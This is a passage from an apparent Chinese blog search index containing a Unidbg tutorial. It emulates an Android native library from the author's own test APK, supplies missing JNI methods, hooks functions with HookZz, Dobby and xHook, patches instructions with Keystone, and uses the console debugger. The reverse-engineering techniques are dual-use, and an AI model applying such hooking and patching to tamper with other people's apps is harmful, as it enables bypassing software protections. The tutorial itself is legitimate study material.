args.add(vm.addLocalObject(obj)); args.add(vm.addLocalObject(data)); //调用so函数 md5函数在so中的偏移为0x1C68 Number number = module.callFunction(emulator, 0x1C68, args.toArray()); //根据Number中存储的对象hash取得DvmObject对象 DvmObject\u003c?\u003e object = vm.getObject(number.intValue()); String value = (String) object.getValue(); return value; } 在使用符号调用方式时,Unidbg帮助我们完成了很多操作,例如拼接函数名、填充参数等.但在使用地址调用方式时,这些操作需要我们自己来完成. 上述在构造第三个参数需要注意的是,在Unidbg中,当传入参数为非指针和Number类型时,需要将其定义为DvmObject对象并添加到VM中.而对于常用的String类,Unidbg对其做了相应的封装,这里新建了一个StringObject对象来作为第三个参数. 上述在调用so中的函数后获得的返回值为Number类型,这与实际的返回值String类型不相符.在Unidbg中对于基本类型或者布尔类型,可以直接通过Number获取相应的值.而对于Object对象来说,Number中实际存储的是Object对象的hash值,因此需要先通过vm.getObject()方法来获取DvmObject对象,之后即可通过getValue()方法来获取对象中储存的值,并将其强制转换为String类型后输出. ","date":"2024-06-24","objectID":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/:2:3","tags":["Unidbg"],"title":"进入Unidbg的世界","uri":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/"},{"categories":["Unidbg"],"content":"模拟执行 package com.example.luodst; import com.github.unidbg.AndroidEmulator; import com.github.unidbg.LibraryResolver; import com.github.unidbg.Module; import com.github.unidbg.arm.backend.DynarmicFactory; import com.github.unidbg.linux.android.AndroidEmulatorBuilder; import com.github.unidbg.linux.android.AndroidResolver; import com.github.unidbg.linux.android.dvm.*; import com.github.unidbg.linux.android.dvm.jni.ProxyDvmObject; import com.github.unidbg.memory.Memory; import com.github.unidbg.virtualmodule.android.AndroidModule; import com.sun.jna.Pointer; import java.awt.*; import java.io.File; import java.util.ArrayList; import java.util.List; public class MainActivity extends AbstractJni { public static void main(String[] args) { MainActivity mainActivity = new MainActivity(); String result = mainActivity.call_addr(); System.out.println(result); } private final AndroidEmulator emulator; private final VM vm; private final Module module; private MainActivity() { //1.创建Android模拟器实例 emulator = AndroidEmulatorBuilder .for64Bit() .addBackendFactory(new DynarmicFactory(true)) .build(); //2.获取操作内存的接口 Memory memory = emulator.getMemory(); //3.设置Android SDK 版本 LibraryResolver resolver = new AndroidResolver(23); memory.setLibraryResolver(resolver); //4.创建虚拟机 vm = emulator.createDalvikVM(new File(\"unidbg-android/src/test/java/com/example/luodst/files/app-debug.apk\")); //5.是否打印日志 vm.setVerbose(false); //6.设置jni vm.setJni(this); new AndroidModule(emulator,vm).register(memory); //7.加载目标so文件 DalvikModule dm = vm.loadLibrary(\"luodst\", true); //8.将so文件对应的Module存入成员变量 module = dm.getModule(); //9.调用JNI_OnLoad dm.callJNI_OnLoad(emulator); } private String call_md5() { //执行JNI方法 DvmObject obj = ProxyDvmObject.createObject(vm,this); //DvmObject obj = vm.resolveClass(\"com.example.luodst.MainActivity\").newObject(null); DvmObject dvmObject = obj.callJniMethodObject(emulator, \"md5(Ljava/lang/String;)Ljava/lang/String;\", \"XiaLuoHun\"); String retval = (String) dvmObject.getValue(); return retval; } private String call_addr() { //构造函数参数 Pointer jniEnv = vm.getJNIEnv(); DvmObject obj = ProxyDvmObject.createObject(vm,this); StringObject data = new StringObject(vm, \"XiaLuoHun\"); //构造为参数列表 List\u003cObject\u003e args = new ArrayList\u003c\u003e(); args.add(jniEnv); args.add(vm.addLocalObject(obj)); args.add(vm.addLocalObject(data)); //调用so函数 md5函数在so中的偏移为0x1C68 Number number = module.callFunction(emulator, 0x1C68, args.toArray()); //根据Number中存储的对象hash取得DvmObject对象 DvmObject\u003c?\u003e object = vm.getObject(number.intValue()); String value = (String) object.getValue(); return value; } } ","date":"2024-06-24","objectID":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/:2:4","tags":["Unidbg"],"title":"进入Unidbg的世界","uri":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/"},{"categories":["Unidbg"],"content":"修补执行环境 ","date":"2024-06-24","objectID":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/:3:0","tags":["Unidbg"],"title":"进入Unidbg的世界","uri":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/"},{"categories":["Unidbg"],"content":"测试Apk java层: package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.text.TextUtils; import android.view.View; import android.widget.Button; import android.widget.TextView; import com.example.luodst.databinding.ActivityMainBinding; import java.security.MessageDigest; import java.security.NoSuchAlgorithmException; public class MainActivity extends AppCompatActivity { // Used to load the 'luodst' library on application startup. static { System.loadLibrary(\"luodst\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); TextView tv = binding.sampleText; findViewById(R.id.btn_md5).setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { tv.setText(md52(\"XiaLuoHun\".getBytes())); } }); } private String md5Java(byte[] data) { try { MessageDigest digest = MessageDigest.getInstance(\"md5\"); digest.update(data); byte[] digest1 = digest.digest(); return byte2Hex(digest1); } catch (NoSuchAlgorithmException e) { e.printStackTrace(); } return null; } public String byte2Hex(byte[] data){ StringBuilder sb = new StringBuilder(); for (byte b : data){ String s = Integer.toHexString(b \u0026 0xFF); if (s.length() \u003c 2){ sb.append(\"0\"); } sb.append(s); } return sb.toString(); } public native String md52(byte[] data); } Native层: #include \u003cjni.h\u003e #include \u003cstring\u003e extern \"C\" JNIEXPORT jstring JNICALL Java_com_example_luodst_MainActivity_md52(JNIEnv *env, jobject thiz, jbyteArray data) { jclass MessageDigest = env-\u003eFindClass(\"java/security/MessageDigest\"); jmethodID getInstance = env-\u003eGetStaticMethodID(MessageDigest,\"getInstance\", \"(Ljava/lang/String;)Ljava/security/MessageDigest;\"); jobject digest = env-\u003eCallStaticObjectMethod(MessageDigest,getInstance,env-\u003eNewStringUTF(\"md5\")); jmethodID update = env-\u003eGetMethodID(MessageDigest, \"update\", \"([B)V\"); env-\u003eCallVoidMethod(digest,update,data); jmethodID dig = env-\u003eGetMethodID(MessageDigest,\"digest\", \"()[B\"); jobject result = env-\u003eCallObjectMethod(digest,dig); jclass MainActivity = env-\u003eFindClass(\"com/example/luodst/MainActivity\"); jmethodID bytes2Hex = env-\u003eGetMethodID(MainActivity,\"byte2Hex\",\"([B)Ljava/lang/String;\"); jobject string_result = env-\u003eCallObjectMethod(thiz,bytes2Hex,result); return static_cast\u003cjstring\u003e(string_result); } ","date":"2024-06-24","objectID":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/:3:1","tags":["Unidbg"],"title":"进入Unidbg的世界","uri":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/"},{"categories":["Unidbg"],"content":"模拟执行 package com.example.luodst; import com.github.unidbg.AndroidEmulator; import com.github.unidbg.LibraryResolver; import com.github.unidbg.Module; import com.github.unidbg.arm.backend.DynarmicFactory; import com.github.unidbg.linux.android.AndroidEmulatorBuilder; import com.github.unidbg.linux.android.AndroidResolver; import com.github.unidbg.linux.android.dvm.*; import com.github.unidbg.linux.android.dvm.jni.ProxyDvmObject; import com.github.unidbg.memory.Memory; import com.github.unidbg.virtualmodule.android.AndroidModule; import java.io.File; public class MainActivity extends AbstractJni { public static void main(String[] args) { MainActivity mainActivity = new MainActivity(); String result = mainActivity.call_md5(); System.out.println(result); } private final AndroidEmulator emulator; private final VM vm; private final Module module; private MainActivity() { //1.创建Android模拟器实例 emulator = AndroidEmulatorBuilder .for64Bit() .addBackendFactory(new DynarmicFactory(true)) .build(); //2.获取操作内存的接口 Memory memory = emulator.getMemory(); //3.设置Android SDK 版本 LibraryResolver resolver = new AndroidResolver(23); memory.setLibraryResolver(resolver); //4.创建虚拟机 vm = emulator.createDalvikVM(new File(\"unidbg-android/src/test/java/com/example/luodst/files/app-debug.apk\")); //5.是否打印日志 vm.setVerbose(false); //6.设置jni //vm.setJni(this); new AndroidModule(emulator, vm).register(memory); //7.加载目标so文件 DalvikModule dm = vm.loadLibrary(\"luodst\", true); //8.将so文件对应的Module存入成员变量 module = dm.getModule(); //9.调用JNI_OnLoad dm.callJNI_OnLoad(emulator); } private String call_md5() { //执行JNI方法 DvmObject obj = ProxyDvmObject.createObject(vm, this); //DvmObject obj = vm.resolveClass(\"com.example.luodst.MainActivity\").newObject(null); DvmObject dvmObject = obj.callJniMethodObject(emulator, \"md52([B)Ljava/lang/String;\", \"XiaLuoHun\".getBytes()); String retval = (String) dvmObject.getValue(); return retval; } } 使用上述Unidbg代码进行模拟调用时,会报下述错误. java.lang.IllegalStateException: Please vm.setJni(jni) at com.github.unidbg.linux.android.dvm.Hashable.checkJni(Hashable.java:8) at com.github.unidbg.linux.android.dvm.DvmClass.getStaticMethodID(DvmClass.java:101) at com.github.unidbg.linux.android.dvm.DalvikVM64$110.handle(DalvikVM64.java:1787) at com.github.unidbg.linux.ARM64SyscallHandler.hook(ARM64SyscallHandler.java:121) 由于模拟执行的函数中有JNI操作,而不同的so调用的JNI方法有所不同,Unidbg无法为其一一实现,缺失的部分需要我们自己来实现,因此上述提示我们需要设置vm.setJni()来实现缺失的JNI接口部分. 当我们调用了vm.setJni()方法时,再次运行,会报下述错误. java.lang.UnsupportedOperationException: java/security/MessageDigest-\u003eupdate([B)V at com.github.unidbg.linux.android.dvm.AbstractJni.callVoidMethodV(AbstractJni.java:1007) at com.github.unidbg.linux.android.dvm.AbstractJni.callVoidMethodV(AbstractJni.java:990) at com.github.unidbg.linux.android.dvm.DvmMethod.callVoidMethodV(DvmMethod.java:229) at com.github.unidbg.linux.android.dvm.DalvikVM64$59.handle(DalvikVM64.java:1078) 我们需要重写报错的callVoidMethodV方法,为Unidbg补全缺失的update()方法的具体实现,使之可以继续执行.这个补齐JNI的过程叫做\"补环境\". 具体的修补代码如下: public void callVoidMethodV(BaseVM vm, DvmObject\u003c?\u003e dvmObject, String signature, VaList vaList) { switch (signature) { case \"java/security/MessageDigest-\u003eupdate([B)V\": { MessageDigest messageDigest = (MessageDigest) dvmObject.getValue(); int intArg = vaList.getIntArg(0); Object obj = vm.getObject(intArg).getValue(); messageDigest.update((byte[]) obj); return; } } super.callVoidMethodV(vm, dvmObject, signature, vaList); } 当执行到上述方法时,参数vm为虚拟机,dvmObject为调用该函数的对象,signature为函数的签名,vaList为函数的参数列表. 在执行messageDigest.update()方法时,我们需要先取得messageDigest对象,dvmObject是调用该方法的对象,因此可以通过dvmObject.getValue()方法来获取messageDigest对象. update()方法的参数为byte[],而在JNI中没有对象的概念.因此Unidbg为非基本类型维护了一个Map引用,通过getIntArg()方法取得Map中的key值,然后通过getObject()方法从VM虚拟机中取得该对象,最后通过getValue()方法取得实际对象的值. 修补完update()方法后继续运行,会出现下述错误. java.lang.UnsupportedOperationException: java/security/MessageDigest-\u003edigest()[B at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417) at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMeth","date":"2024-06-24","objectID":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/:3:2","tags":["Unidbg"],"title":"进入Unidbg的世界","uri":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/"},{"categories":["Unidbg"],"content":"Unidbg Hook Unidbg支持多种Hook框架,如HookZz、Dobby、xHook、whale等.下面我们使用HookZz来完成对64位so程序的Hook ","date":"2024-06-24","objectID":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/:4:0","tags":["Unidbg"],"title":"进入Unidbg的世界","uri":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/"},{"categories":["Unidbg"],"content":"测试Apk java层: package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.view.View; import android.widget.TextView; import com.example.luodst.databinding.ActivityMainBinding; public class MainActivity extends AppCompatActivity { // Used to load the 'luodst' library on application startup. static { System.loadLibrary(\"luodst\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); TextView tv = binding.sampleText; findViewById(R.id.btn_md5).setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { tv.setText(String.valueOf(add(10, 5))); } }); } public native int add(int a, int b); } Native层: #include \u003cjni.h\u003e #include \u003cstring\u003e extern \"C\" JNIEXPORT jint JNICALL Java_com_example_luodst_MainActivity_add(JNIEnv *env, jobject thiz, jint a, jint b) { if(a \u003c 0){ a = -a; } if(b \u003c 0){ b = -b; } return a + b; } ","date":"2024-06-24","objectID":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/:4:1","tags":["Unidbg"],"title":"进入Unidbg的世界","uri":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/"},{"categories":["Unidbg"],"content":"HookZz HookZz的wrap方法只是在函数的头、尾来添加并执行额外的逻辑,并不影响函数原来的代码.示例如下: HookZz hookZz = HookZz.getInstance(emulator); hookZz.wrap(module.base + 0x1648, new WrapCallback\u003cHookZzArm64RegisterContextImpl\u003e() { @Override //在函数执行之前执行的回调函数 public void preCall(Emulator\u003c?\u003e emulator, HookZzArm64RegisterContextImpl ctx, HookEntryInfo info) { System.out.println(String.format(\"X2: %d, X3: %d\",ctx.getIntArg(2),ctx.getIntArg(3))); //将值保存到ctx中,方便在postCall方法中获取 ctx.push(1000); } @Override //在函数执行之后执行的回调函数 public void postCall(Emulator\u003c?\u003e emulator, HookZzArm64RegisterContextImpl ctx, HookEntryInfo info) { //从ctx中取得保存的值 int arg = ctx.pop(); ctx.setXLong(0, arg); super.postCall(emulator, ctx, info); } }); HookZz的replace是替换掉函数,让函数不执行.当第三个参数为true时,表示执行原函数,此时类似于wrap方法.示例如下: HookZz hook = HookZz.getInstance(emulator); hook.replace(module.base + 0x1648, new ReplaceCallback() { @Override public HookStatus onCall(Emulator\u003c?\u003e emulator, HookContext context, long originFunction) { System.out.println(String.format(\"Before X2: %d, X3: %d\",context.getIntArg(2),context.getIntArg(3))); emulator.getBackend().reg_write(Unicorn.UC_ARM64_REG_X2,5); System.out.println(String.format(\"After X2: %d, X3: %d\",context.getIntArg(2),context.getIntArg(3))); emulator.getBackend().reg_write(Unicorn.UC_ARM64_REG_X0,1000); //如果不想执行原函数,可直接返回LR寄存器中的地址 return HookStatus.RET(emulator, context.getLR()); //return super.onCall(emulator, context, originFunction); } @Override public void postCall(Emulator\u003c?\u003e emulator, HookContext context) { super.postCall(emulator, context); } }, false); onCall()方法是在函数执行之前执行,postCall()方法是在函数执行结束后执行.postCall()方法默认是不执行的,需要配置第三个参数enablePostCall为true来启用. Unidbg Hook完整代码如下: package com.example.luodst; import com.github.unidbg.AndroidEmulator; import com.github.unidbg.Emulator; import com.github.unidbg.LibraryResolver; import com.github.unidbg.Module; import com.github.unidbg.arm.HookStatus; import com.github.unidbg.arm.backend.DynarmicFactory; import com.github.unidbg.arm.context.RegisterContext; import com.github.unidbg.hook.HookContext; import com.github.unidbg.hook.ReplaceCallback; import com.github.unidbg.hook.hookzz.*; import com.github.unidbg.hook.xhook.IxHook; import com.github.unidbg.linux.android.AndroidEmulatorBuilder; import com.github.unidbg.linux.android.AndroidResolver; import com.github.unidbg.linux.android.XHookImpl; import com.github.unidbg.linux.android.dvm.*; import com.github.unidbg.linux.android.dvm.jni.ProxyDvmObject; import com.github.unidbg.memory.Memory; import com.github.unidbg.pointer.UnidbgPointer; import com.github.unidbg.virtualmodule.android.AndroidModule; import unicorn.Unicorn; import java.io.File; public class MainActivity extends AbstractJni { public static void main(String[] args) { MainActivity mainActivity = new MainActivity(); mainActivity.hook(); mainActivity.call_func(); } private final AndroidEmulator emulator; private final VM vm; private final Module module; private MainActivity() { //1.创建Android模拟器实例 emulator = AndroidEmulatorBuilder .for64Bit() .addBackendFactory(new DynarmicFactory(true)) .build(); //2.获取操作内存的接口 Memory memory = emulator.getMemory(); //3.设置Android SDK 版本 LibraryResolver resolver = new AndroidResolver(23); memory.setLibraryResolver(resolver); //4.创建虚拟机 vm = emulator.createDalvikVM(new File(\"unidbg-android/src/test/java/com/example/luodst/files/app-debug.apk\")); //5.是否打印日志 vm.setVerbose(false); //6.设置jni vm.setJni(this); new AndroidModule(emulator, vm).register(memory); //7.加载目标so文件 DalvikModule dm = vm.loadLibrary(\"luodst\", true); //8.将so文件对应的Module存入成员变量 module = dm.getModule(); //9.调用JNI_OnLoad dm.callJNI_OnLoad(emulator); } private void call_func() { //执行JNI方法 DvmObject obj = ProxyDvmObject.createObject(vm, this); //DvmObject obj = vm.resolveClass(\"com.example.luodst.MainActivity\").newObject(null); int nRet = obj.callJniMethodInt(emulator, \"add(II)I\", 10, 5); System.out.println(nRet); } public void hook(){ HookZz hookZz = HookZz.getInstance(emulator); hookZz.wrap(module.base + 0x1648, new WrapCallback\u003cHookZzA","date":"2024-06-24","objectID":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/:4:2","tags":["Unidbg"],"title":"进入Unidbg的世界","uri":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/"},{"categories":["Unidbg"],"content":"Dobby Dobby的各个方法与接口和HookZz差不多.示例如下: Dobby dobby = Dobby.getInstance(emulator); dobby.replace(module.base + 0x1648, new ReplaceCallback() { @Override public HookStatus onCall(Emulator\u003c?\u003e emulator, HookContext context, long originFunction) { emulator.getBackend().reg_write(Unicorn.UC_ARM64_REG_X0,1000); //如果不想执行原函数,可直接返回LR寄存器中的地址 return HookStatus.RET(emulator, context.getLR()); //return super.onCall(emulator, context, originFunction); } @Override public void postCall(Emulator\u003c?\u003e emulator, HookContext context) { super.postCall(emulator, context); } }, false); ","date":"2024-06-24","objectID":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/:4:3","tags":["Unidbg"],"title":"进入Unidbg的世界","uri":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/"},{"categories":["Unidbg"],"content":"xHook xHook仅能实现符号表的Hook,优点是稳定.示例如下: IxHook ixHook = XHookImpl.getInstance(emulator); ixHook.register(\"libc.so\", \"strlen\", new ReplaceCallback() { @Override public HookStatus onCall(Emulator\u003c?\u003e emulator, HookContext context, long originFunction) { System.out.println(\"Enter\"); return super.onCall(emulator, context, originFunction); } @Override public void postCall(Emulator\u003c?\u003e emulator, HookContext context) { //emulator.getBackend().reg_write(Unicorn.UC_ARM64_REG_X0,1000); super.postCall(emulator, context); } }, true); //需要调用refresh方法来刷新后才能Hook ixHook.refresh(); 注意 上述传入的函数名称是原始名称,而不是经过IDA解释后的名称. ","date":"2024-06-24","objectID":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/:4:4","tags":["Unidbg"],"title":"进入Unidbg的世界","uri":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/"},{"categories":["Unidbg"],"content":"Unidbg Patch ","date":"2024-06-24","objectID":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/:5:0","tags":["Unidbg"],"title":"进入Unidbg的世界","uri":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/"},{"categories":["Unidbg"],"content":"测试Apk 同Unidbg Hook测试Apk ","date":"2024-06-24","objectID":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/:5:1","tags":["Unidbg"],"title":"进入Unidbg的世界","uri":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/"},{"categories":["Unidbg"],"content":"Patch 如果想要在Unidbg中修改程序的逻辑代码,可以利用Patch技术. 下面展示将下述so中的ADD指令修改为SUB指令. 可通过下述网站来讲汇编指令转换为机器码. https://armconverter.com/ Patch代码如下: public void patch(){ UnidbgPointer pointer = UnidbgPointer.pointer(emulator,module.base + 0x16B4); byte[] code = new byte[]{(byte) 0x00, 0x01, 0x09, 0x4B}; pointer.write(code); } 也可以使用Keystone将汇编指令自动转换为机器码. public void patch2(){ UnidbgPointer pointer = UnidbgPointer.pointer(emulator,module.base + 0x16B4); Keystone keystone = new Keystone(KeystoneArchitecture.Arm64, KeystoneMode.LittleEndian); String s = \"SUB W0, W8, W9\"; byte[] machineCode = keystone.assemble(s).getMachineCode(); //System.out.println(Arrays.toString(machineCode)); pointer.write(machineCode); } 完整的Unidbg代码如下: package com.example.luodst; import com.github.unidbg.AndroidEmulator; import com.github.unidbg.LibraryResolver; import com.github.unidbg.Module; import com.github.unidbg.arm.backend.DynarmicFactory; import com.github.unidbg.linux.android.AndroidEmulatorBuilder; import com.github.unidbg.linux.android.AndroidResolver; import com.github.unidbg.linux.android.dvm.*; import com.github.unidbg.linux.android.dvm.jni.ProxyDvmObject; import com.github.unidbg.memory.Memory; import com.github.unidbg.pointer.UnidbgPointer; import com.github.unidbg.virtualmodule.android.AndroidModule; import keystone.Keystone; import keystone.KeystoneArchitecture; import keystone.KeystoneMode; import java.io.File; public class MainActivity extends AbstractJni { public static void main(String[] args) { MainActivity mainActivity = new MainActivity(); mainActivity.patch2(); mainActivity.call_func(); } private final AndroidEmulator emulator; private final VM vm; private final Module module; private MainActivity() { //1.创建Android模拟器实例 emulator = AndroidEmulatorBuilder .for64Bit() .addBackendFactory(new DynarmicFactory(true)) .build(); //2.获取操作内存的接口 Memory memory = emulator.getMemory(); //3.设置Android SDK 版本 LibraryResolver resolver = new AndroidResolver(23); memory.setLibraryResolver(resolver); //4.创建虚拟机 vm = emulator.createDalvikVM(new File(\"unidbg-android/src/test/java/com/example/luodst/files/app-debug.apk\")); //5.是否打印日志 vm.setVerbose(false); //6.设置jni vm.setJni(this); new AndroidModule(emulator, vm).register(memory); //7.加载目标so文件 DalvikModule dm = vm.loadLibrary(\"luodst\", true); //8.将so文件对应的Module存入成员变量 module = dm.getModule(); //9.调用JNI_OnLoad dm.callJNI_OnLoad(emulator); } private void call_func() { //执行JNI方法 DvmObject obj = ProxyDvmObject.createObject(vm, this); //DvmObject obj = vm.resolveClass(\"com.example.luodst.MainActivity\").newObject(null); int nRet = obj.callJniMethodInt(emulator, \"add(II)I\", 10, 5); System.out.println(nRet); } public void patch(){ UnidbgPointer pointer = UnidbgPointer.pointer(emulator,module.base + 0x16B4); byte[] code = new byte[]{(byte) 0x00, 0x01, 0x09, 0x4B}; pointer.write(code); } public void patch2(){ UnidbgPointer pointer = UnidbgPointer.pointer(emulator,module.base + 0x16B4); Keystone keystone = new Keystone(KeystoneArchitecture.Arm64, KeystoneMode.LittleEndian); String s = \"SUB W0, W8, W9\"; byte[] machineCode = keystone.assemble(s).getMachineCode(); //System.out.println(Arrays.toString(machineCode)); pointer.write(machineCode); } } ","date":"2024-06-24","objectID":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/:5:2","tags":["Unidbg"],"title":"进入Unidbg的世界","uri":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/"},{"categories":["Unidbg"],"content":"Unidbg Debugger Unidbg还对Hook进行了封装,提供了调试器功能,可以让我们很方便地在控制台进行调试.除了提供Console Debugger,还支持GDB与IDA协助调试. ","date":"2024-06-24","objectID":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/:6:0","tags":["Unidbg"],"title":"进入Unidbg的世界","uri":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/"},{"categories":["Unidbg"],"content":"测试Apk 同Unidbg Hook测试Apk ","date":"2024-06-24","objectID":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/:6:1","tags":["Unidbg"],"title":"进入Unidbg的世界","uri":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/"},{"categories":["Unidbg"],"content":"Debugger 在使用调试器功能时,需要使用默认的Unicorn后端.调用调试器的相关代码如下: //attach方法的参数如下: public enum DebuggerType { /** * console debugger */ CONSOLE, /** * gdb server */ GDB_SERVER, /** * ida android server v7.x */ ANDROID_SERVER_V7 } //附加调试器,并添加相应地址的断点 emulator.attach(DebuggerType.CONSOLE).addBreakPoint(module.base + 0x1648); //或者添加一个回调 emulator.attach(DebuggerType.CONSOLE).addBreakPoint(module.base + 0x1648, new BreakPointCallback() { @Override public boolean onHit(Emulator\u003c?\u003e emulator, long address) { //修改寄存器等操作 //返回false则继续断下,返回true则不断下 return false; } }); 当attach方法的参数为空时,默认使用Console Debugger 使用Console Debugger进行调试的界面如下: 调试指令如下: help c: 继续 n: 单步步过 s: 单步步进 d: 显示反汇编 mr0-mr7, mfp, mip, msp [size]: 查看指定寄存器内存 mr0s-mr7s: 将寄存器指向的内存空间数据当做字符串来读取 m(address) [size]: 查看指定地址内存 //--- Unidbg Debugger完整代码如下: package com.example.luodst; import com.github.unidbg.AndroidEmulator; import com.github.unidbg.Emulator; import com.github.unidbg.LibraryResolver; import com.github.unidbg.Module; import com.github.unidbg.arm.HookStatus; import com.github.unidbg.arm.backend.DynarmicFactory; import com.github.unidbg.arm.backend.Unicorn2Factory; import com.github.unidbg.arm.context.RegisterContext; import com.github.unidbg.debugger.BreakPointCallback; import com.github.unidbg.debugger.DebuggerType; import com.github.unidbg.hook.HookContext; import com.github.unidbg.hook.ReplaceCallback; import com.github.unidbg.hook.hookzz.*; import com.github.unidbg.hook.xhook.IxHook; import com.github.unidbg.linux.android.AndroidEmulatorBuilder; import com.github.unidbg.linux.android.AndroidResolver; import com.github.unidbg.linux.android.XHookImpl; import com.github.unidbg.linux.android.dvm.*; import com.github.unidbg.linux.android.dvm.jni.ProxyDvmObject; import com.github.unidbg.memory.Memory; import com.github.unidbg.pointer.UnidbgPointer; import com.github.unidbg.virtualmodule.android.AndroidModule; import unicorn.Unicorn; import java.io.File; public class MainActivity extends AbstractJni { public static void main(String[] args) { MainActivity mainActivity = new MainActivity(); mainActivity.call_func(); } private final AndroidEmulator emulator; private final VM vm; private final Module module; private MainActivity() { //1.创建Android模拟器实例 emulator = AndroidEmulatorBuilder .for64Bit() .addBackendFactory(new Unicorn2Factory(true)) .build(); //2.获取操作内存的接口 Memory memory = emulator.getMemory(); //3.设置Android SDK 版本 LibraryResolver resolver = new AndroidResolver(23); memory.setLibraryResolver(resolver); //4.创建虚拟机 vm = emulator.createDalvikVM(new File(\"unidbg-android/src/test/java/com/example/luodst/files/app-debug.apk\")); //5.是否打印日志 vm.setVerbose(false); //6.设置jni vm.setJni(this); new AndroidModule(emulator, vm).register(memory); //7.加载目标so文件 DalvikModule dm = vm.loadLibrary(\"luodst\", true); //8.将so文件对应的Module存入成员变量 module = dm.getModule(); //9.调用JNI_OnLoad dm.callJNI_OnLoad(emulator); } private void call_func() { emulator.attach(DebuggerType.CONSOLE).addBreakPoint(module.base + 0x1648, new BreakPointCallback() { @Override public boolean onHit(Emulator\u003c?\u003e emulator, long address) { //修改寄存器等操作 //返回false则继续断下,返回true则不断下 return false; } }); //执行JNI方法 DvmObject obj = ProxyDvmObject.createObject(vm, this); //DvmObject obj = vm.resolveClass(\"com.example.luodst.MainActivity\").newObject(null); int nRet = obj.callJniMethodInt(emulator, \"add(II)I\", 10, 5); System.out.println(nRet); } } ","date":"2024-06-24","objectID":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/:6:2","tags":["Unidbg"],"title":"进入Unidbg的世界","uri":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/"},{"categories":["Unidbg"],"content":"参考链接 \u003cUnidbg逆向工程 原理与实践\u003e ","date":"2024-06-24","objectID":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/:7:0","tags":["Unidbg"],"title":"进入Unidbg的世界","uri":"/posts/android/unidbg/01%E8%BF%9B%E5%85%A5unidbg%E7%9A%84%E4%B8%96%E7%95%8C/"},{"categories":["x64Dbg"],"content":"值 很多命令都接受表达式和值作为参数.下面是所有受支持的数值: 